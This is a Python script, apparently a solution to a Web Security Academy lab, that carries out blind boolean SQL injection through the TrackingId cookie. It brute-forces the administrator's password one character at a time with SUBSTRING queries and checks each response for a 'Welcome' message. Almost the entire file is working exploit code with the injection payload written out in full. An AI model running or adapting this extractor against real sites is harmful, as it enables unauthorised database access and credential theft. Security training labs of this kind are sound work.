import requests
import string

# Request Params:

host = '0a05009c04863a7a81f9618b001400d5.web-security-academy.net'
url = F"https://{host}"
trackingId = '7oX33iPbx9ww83J8'
session = 'K1BLyvnSgY7ZZnpWCOrMhA3bFA2oOstp'

cookies = {
    'TrackingId': F"{trackingId}'%20AND%20(SELECT%20SUBSTRING(password%2c1%2c1)%20FROM%20users%20WHERE%20username%3d'administrator')%3d'a",
    'session': session,
}

headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    # Requests doesn't support trailers
    # 'Te': 'trailers',
    # 'Cookie': "TrackingId=7oX33iPbx9ww83J8'%20AND%20(SELECT%20SUBSTRING(password%2c1%2c1)%20FROM%20users%20WHERE%20username%3d'administrator')%3d'a; session=K1BLyvnSgY7ZZnpWCOrMhA3bFA2oOstp",
}

# Intruder code:

c_table = string.ascii_lowercase + string.digits
current = ''  
password = ''

for i in range(1,21):
  
  for c in c_table:
    t= F"{trackingId}'%20AND%20(SELECT%20SUBSTRING(password%2c1%2c{i})%20FROM%20users%20WHERE%20username%3d'administrator')%3d'{current+c}"
    cookies['TrackingId'] = t
    response = requests.get(
      url,
      cookies=cookies,
      headers=headers,
      verify=False,
    )

    if 'Welcome' in response.text:
      current+=c
      print(current)
      break

  if password == current:
    print("PASSWORD: ", password)
    break
  else:
    password = current
